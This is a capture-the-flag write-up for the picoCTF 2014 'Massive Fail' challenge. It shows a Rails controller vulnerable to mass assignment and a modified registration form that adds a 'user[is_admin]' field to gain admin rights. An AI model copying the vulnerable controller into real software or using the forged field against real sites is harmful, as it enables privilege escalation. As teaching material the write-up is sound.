### Solved by barrebas

Massive Fail is a 120 point challenge. 

`Fed up with their recent PHP related issues, Daedalus Corp. has switched their website to run on Ruby on Rails (version 3.1.0) instead. Their brand new registration page does not seem like much of an improvement though... [Source].`

We're given the source to a Ruby on Rails website. We need to register as an admin to get the flag. The interesting bit is in `db/schema.rb` and `app/controller/user_controller.rb`.

```
ActiveRecord::Schema.define(:version => 20141008175655) do

  create_table "users", :force => true do |t|
    t.string   "username"
    t.string   "password"
    t.string   "name"
    t.boolean  "is_admin"
    t.datetime "created_at"
    t.datetime "updated_at"
  end

end

class UserController < ApplicationController
  def register     
  end

  def create
    # User.new creates a new user according to ALL the parameters
    @new_user = User.new(params[:user])
    @new_user.save
  end
end
```

The application registers the user using *ALL* supplied parameters. So let's supply a few more, shall we? Download the registration page and "tweak" it a bit:

```html
<form accept-charset="UTF-8" action="http://web2014.picoctf.com:5000/user/create" method="post"><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /><input name="authenticity_token" type="hidden" value="+yYhUookKb5lZuf2bU97ccd3TWYizvaxFYpWfR5H/b8=" /></div>
  <div class="control-group">
    <label class="control-label" for="user_name">Name</label>:
    <div class="controls">
      <input id="user_name" name="user[name]" size="30" type="text" />
    </div>
  </div>

  <div class="control-group">
    <label class="control-label" for="user_username">Username</label>:
    <div class="controls">
      <input id="user_username" name="user[username]" size="30" type="text" />
    </div>
  </div>

  <div class="control-group">
    <label class="control-label" for="user_password">Password</label>:
    <div class="controls">
      <input id="user_password" name="user[password]" size="30" type="password" />
    </div>
  </div>
    <div class="control-group">
    <label class="control-label" for="user_is_admin">is_admin</label>:
    <div class="controls">
      <input id="user_password" name="user[is_admin]" size="30" type="text" value="1" />
    </div>
  </div>
```

By adding the `user[is_admin]` parameter, the register page thinks we are admin and gives us the flag:

![](/images/2014/pico/massive-fail/daedelus.png)
